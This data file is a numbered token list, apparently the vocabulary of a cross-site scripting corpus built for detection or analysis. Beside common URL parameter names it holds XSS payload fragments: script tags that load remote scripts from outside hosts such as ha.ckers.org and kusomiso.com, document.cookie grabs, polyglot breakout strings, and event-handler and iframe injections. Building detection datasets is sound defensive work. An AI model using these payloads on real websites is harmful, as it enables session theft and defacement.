,tokens
0,k=
1,n=
2,http://u
3,>
4,</script>
5,)
6,alert(
7,<script>
8,b0=
9,document.cookie
10,precio=
11,login=
12,nombre=
13,0
14,<h0>
15,</h0>
16,"""maxwel"""
17,<marquee>
18,</marquee>
19,email=
20,password=
21,provincia=
22,cp=
23,ntc=
24,ciudad=
25,direccion=
26,apellidos=
27,dni=
28,pwd=
29,remember=
30,cantidad=
31,</title>
32,string.fromcharcode(
33,y=
34,'xss'
35,x=
36,"""backdoor"""
37,<script/src=http://kusomiso.com/xss.js>
38,id=
39,http://www
40,"""xss"""
41,/xss/
42,user_rating=
43,submit_vote=
44,url=
45,"<script 
>"
46,submit=
47,page=
48,</a>
49,</iframe>
50,<br>
51,q=
52,"0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)"
53,search=
54,cid=
55,keyword=
56,lang=
57,itemid=
58,"<iframe src=""http://xssed.com"">"
59,src=
60,type=
61,task=
62,pop=
63,query=
64,"0,0,0))//';alert(string.fromcharcode(0,0,0))//"";alert(string.fromcharcode(0,0,0))//"";alert(string.fromcharcode(0,0,0))//--></script>"">'><script>alert(string.fromcharcode(0,0,0)"
65,a=
66,b=
67,option=
68,http://xssed
69,a(
70,b(
71,"0,0,0)"
72,/xssed/
73,cat=
74,<script src=http://vuln.xssed.net/thirdparty/scripts/python0.js>
75,</style>
76,/xss/.source)
77,strkey=
78,name=
79,</textarea>
80,s=
81,title=
82,"""scriptorium(turkey)"""
83,ortak=
84,<body onload=alert(0)>
85,<p
86,p=
87,from=
88,mode=
89,<iframe src=http://google.com>
90,year=
91,<script src=http://vuln.xssed.net/thirdparty/scripts/hotpockets.js>
92,"""bluemax"""
93,action=
94,<script/src=http://kusomiso.com/x.js>
95,/ar0sw0rmed/
96,<iframe
97,category=
98,javascript:
99,<iframe src=javascript:alert(0)>
100,http://kusomiso
101,'trex'
102,keywords=
103,onmouseover=
104,<iframe src=http://www.google.de>
105,sort=
106,"<marquee bgcolor=""red"">"
107,'xssed'
108,"<""<<script>"
109,"""cyber"""
110,backdoor
111,"""scriptorium(turkey)hackhaber.com"""
112,onerror=
113,site=
114,http://localhost
115,tag=
116,'x'
117,setday=
118,start=
119,"0,0,0,0,0,0,0,0,0,0,0,0))//';alert(string.fromcharcode(0,0,0,0,0,0,0,0,0,0,0,0))//"";alert(string.fromcharcode(0,0,0,0,0,0,0,0,0,0,0,0))//"";alert(string.fromcharcode(0,0,0,0,0,0,0,0,0,0,0,0))//--></script>"">'><script>alert(string.fromcharcode(0,0,0,0,0,0,0,0,0,0,0,0)"
120,<script
121,setdate=
122,t=
123,</font>
124,</marque>
125,<iframe src=http://xssed.com>
126,ref=
127,<!--
128,"0,0,0,0,0,0,0,0,0,0,0,0)"
129,c=
130,no=
131,0:
132,<center>
133,"""document.cookie"""
134,w=
135,"""fugitif"""
136,<script src=http://vuln.xssed.net/thirdparty/scripts/ckers.org.js>
137,location=
138,view=
139,/the-sh0ck-b0y/
140,document.write(
141,type:
142,"<body onload=alert(""by encore"")>"
143,java:
144,l=
145,<script src=http://starext.by.ru/lt.js>
146,language=
147,<iframe onload=alert(/xss/)>
148,searchstring=
149,<img src=k.png onerror=alert(/xss/.source) />
150,form=
151,m=
152,pid=
153,/www.r0t.n0t.nl/
154,</div>
155,lid=
156,<</script>
157,recpag=
158,sid=
159,http://vuln
160,"<"""
161,results=
162,/xssed_by_omeha/);</script><script>alert(document.cookie
163,search_type=
164,cyber-unity
165,http://cyber
166,country=
167,searchterm=
168,"""cyber-warrior.org"""
169,words=
170,ie=
171,</center>
172,r=
173,dil=
174,/st@r-gaz0r/
175,'0ssi0-xht'
176,qs=
177,cal=
178,o=
179,'i-landet'
180,key=
181,searchtxt=
182,"""xssed"""
183,submit0=
184,/xss/.source
185,qt=
186,searchtype=
187,'drakula'
188,length:
189,msg=
190,go=
191,<<script>
192,'the_miller'
193,st=
194,<noscript>
195,source=
196,username=
197,tipo=
198,month=
199,kelime=
200,path=
201,<script src=http://ha.ckers.org/s.js>
202,</img>
203,text=
204,'0ssi0_tr'
205,"<meta http-equiv=""refresh"" content=""0;url=http://www.canixim.com"">"
206,<plaintext>
207,method=
208,as_pcia_id=
209,as_nickname=
210,output=
211,<script src=http://ha.ckers.org/xss.js>
212,forid:
213,cof=
214,'s0m.ph'
215,/zeryus/
216,"0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)"
217,"""resistance"""
218,act=
219,<title>
220,city=
221,<body onload=alert('xss')>
222,d=
223,"""xssbydt"""
224,document.domain
225,filter=
226,item=
227,<script >
228,sa=
229,innerhtml=
230,<script src=http://ckers.org/s>
231,num=
232,section=
233,v=
234,term=
235,client=
236,<link href=http://starext.by.ru/css.css type=text/css rel=stylesheet>
237,file=
238,uid=
239,content=
240,newsearch=
241,prompt(
242,http://jersain
243,<body onload=alert('kusomiso.com')>
244,http://uber0n
245,charset=
246,'seymen'
247,style=
248,"""x-turk"""
249,fl=
250,illes
251,ts=
252,proxystylesheet=
253,"<img """""">"
254,"<img src=""http://www.cibernautica.com/forocibernautica/upload/norehemzu0.gif"">"
255,/pyske/
256,domain=
257,order=
258,catid=
259,template=
260,f=
261,<body/onload=alert(/xss/)>
262,/securitylab.ir/
263,http:
264,day=
265,/kabus/
266,sortby=
267,<body>
268,hl=
269,state=
270,cmd=
271,mid=
272,wcheadlines=
273,'airroxssed'
274,</head>
275,color:
276,"""kusomiso.com"""
277,<script src=http://lupbot.comule.com/asu_abangjs.php>
278,m_name=
279,'kabus-kabustr.com'
280,<iframe src=http://www.google.com>
281,cat_id=
282,blog=
283,0=
284,target=
285,u=
286,url(
287,titulo=
288,frame=
289,baslik=
290,https:
291,contentid=
292,startrec=
293,searchword=
294,<script language=javascript>
295,zip=
296,oe=
297,op=
298,send=
299,retid=
300,<a
301,"<iframe src=""http://www.xssed.com"">"
302,'=xssbydt='
303,word=
304,"0,0,0,0,0,0,0,0,0,0,0,0))//--></script>"">'><script>alert(string.fromcharcode(0,0,0,0,0,0,0,0,0,0,0,0)"
305,<style>
306,btng=
307,";"""
308,mail=
309,0__bannerid=
310,xss:
311,sub=
312,stype=
313,/xssed_by_omeha/
314,locale=
315,"""cyber_thief(turkey"
316,<body onload=alert(/xss/)>
317,ct=
318,kt=
319,code=
320,</b>
321,menu=
322,"""jock0r"""
323,letter=
324,<script src=http://sinek.pandela.net/j.js>
325,initial=
326,"""xssedbycicosz"""
327,seller=
328,"<metahttp-equiv=""refresh"" content=""0;url=http://www.canixim.com"">"
329,ss=
330,smallclassname=
331,"""i-landet"""
332,count=
333,navigator.useragent
334,"<img src=""http://img0.imageshack.us/img0/0/logonj0.gif"">"
335,lr=
336,link=
337,"0,0,0,0,0,0,0,0,0,0)"
338,e=
339,"<body onload=""alert(0)"">"
340,hid=
341,desc=
342,select=
343,ps=
344,"""starext"""
345,mod=
346,phpsessid=
347,"""evilc0der.com"""
348,<script src=http://byccc.awardspace.com/js/xssccc.js>
349,<script src=http://ha.ckers.org/xss.js?/>
350,"""iblaze"""
351,"<script src=""http://googlebig.com/l.js"">"
352,"""daimon"""
353,lng=
354,val=
355,sec=
356,'cueballr'
357,offset=
358,nav=
359,<iframe src=/>
360,to=
361,/totalschaden/
362,prefix=
363,max_cur=
364,seller_name=
365,'by-panzerturk'
366,<script src=http://www.fileden.com/files/0/0/0/0/xss.gif>
367,</noscript>
368,ad=
369,loc=
370,pagenum=
371,z=
372,"""skyr0x"""
373,height=
374,"0)</script></textarea><script>alert(""kaksii_was_here"")<script>alert('kaksii_was_here');alert(0)</script>""</html><html><script>alert(0"
375,i=
376,topic=
377,http://kabustr
378,dest=
379,kw=
380,<div%20align=center>
381,<font%20size=0>
382,<textarea%20name=0%20cols=0%20rows=0%20id=0>
383,bigclassname=
384,base=
385,"""totalschaden"""
386,error=
387,</body>
388,http://ha
389,eval(
390,alt=
391,"<iframesrc=""http://xssed.com"">"
392,http://data
393,field=
394,ch=
395,refid=
396,<script src=http://droptix.viralcoders.com/xss.js>
397,<font size=0>
398,h=
399,"<""'>"
400,sc=
401,display=
402,file:
403,/xss/.source));</script>}</style><script>a=eval;b=alert;a(b(/xss/.source)
404,zoneid=
405,level=
406,pg=
407,list=
408,<img src=foo.png onerror=alert(/xss/) />
409,cs=
410,format=
411,author=
412,document.cookie);</script><script>alert(/kabus/
413,search:
414,categoryid=
415,<'<<script>
416,<'>
417,ctry=
418,</p>
419,trmcols=
420,addtermo=
421,navdirection=
422,maxtrm=
423,indexkey=
424,channel=
425,<meta
426,<<body onload=prompt(document.domain)>
427,button=
428,sp=
429,qu=
430,image:
431,address=
432,ac=
433,date=
434,pt=
435,left:
436,cisofield0=
437,vid=
438,cc=
439,d:
440,date:
441,visibility:
442,req=
443,sitesearch=
444,rpt=
445,col=
446,age=
447,tab=
448,<img
449,width=
450,c0=
451,width:
452,height:
453,top:
454,<strong>
455,</strong>
456,_pagelabel=
457,gender=
458,catalogid=
459,rows=
460,langid=
461,hitsperpage=
462,sv=
463,position:
464,"<<img """""">"
465,searchtext=
466,l:
467,topsecure.net
468,pxy_t=
469,add_c=
470,a_id=
471,tb=
472,eid=
473,restrict=
474,site:
475,eventid=
476,foo:
477,m0=
478,<br/>
479,pgt=
480,trackquery=
481,fm=
482,countryid=
483,searchval=
484,value_0=
485,hideresetbtn=
486,severity=
487,hidedetails=
488,cisobox0=
489,gimp:
490,galt:
491,forid=
492,div:
493,lc:
494,lbgc:
495,t:
496,"<image path=""img/rotation/bandeau_rotation0.jpg"" />"
497,a0=
498,zbirka0=
499,types=
500,subcategoryid=
501,kwd0=
502,contenttypes=
503,categoryids=
504,platform0=
505,collection:
506,"<img src=http://www.thisiteisntsite.com? onerror=alert(string.fromcharcode(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0))>"
507,e0:
508,errorc_checkout_date_invalid=
509,errorc_checkin_date_invalid=
510,manufacture=
511,price_range=
512,0categoryid=
513,None
